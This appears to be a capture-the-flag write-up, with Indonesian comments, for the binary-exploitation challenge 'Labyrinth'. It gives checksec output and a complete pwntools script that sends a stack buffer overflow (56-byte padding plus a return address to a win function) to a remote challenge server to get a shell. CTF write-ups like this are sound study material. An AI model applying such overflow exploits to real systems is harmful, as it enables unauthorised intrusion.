# Labyrinth

### Category 
PWN / Binary Exploitation.

### Description
> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

### Files
[pwn_labyrinth.zip](./pwn_labyrinth.zip)

### Analysis
**Binary Security**
```
checksec --file=./labyrinth
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY       Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols        No 04               ./labyrinth
```

**Core explanation**
- Full relro - Proteksi GOT
- No canary found - rentan buffer overflow
- NX enabled - Program tidak dapat mengeksekusi shellcode
- No pie - Position address selalu tetap tidak berubah ketika program dijalankan

**Disassembly**


### Exploitation

```python

from pwn import *

IP = "154.57.164.81"
PORT = 31630

# Remote target
io = remote(IP, PORT)

# Local target
# io = process("./labyrinth")

exe = ELF('./labyrinth')
context.binary = exe
context.log_level = 'debug'

# Tunggu sampai baris input pertama muncul
io.recvline(b">> ") 

# Masukkan angka 69 or 069
io.sendline('69')

# Alamat escape_plan setelah push RBP
escape_plan_addr = 0x401256
offset = 56
payload = b'A' * offset + p64(escape_plan_addr)

io.recvline(b">> ")
io.sendline(payload)

res = io.recv(timeout=5)

io.interactive()

```

Ketika program mengeksekusi shell
![flag](/../img/flag.png)

### References
[https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html)
